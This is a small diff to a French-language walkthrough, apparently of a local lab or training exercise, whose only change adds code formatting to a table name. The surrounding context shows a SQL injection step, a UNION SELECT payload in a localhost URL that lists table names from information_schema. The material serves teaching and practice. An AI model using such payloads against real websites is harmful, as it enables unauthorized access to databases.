@@ -53,7 +53,7 @@ Pour aller plus loin, il faut que l'on recupere le nom des tables. POur cela, on
 
 la base de donnees s'appelle `Member_images`
 
-On va ensuite interroger une table speciale appelee information_schema.tables qui contient la liste de toutes les tables
+On va ensuite interroger une table speciale appelee `information_schema.tables` qui contient la liste de toutes les tables
 
 ```url
     http://localhost:8080/index.php?page=searchimg&Submit=Submit&id=0 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema = database()
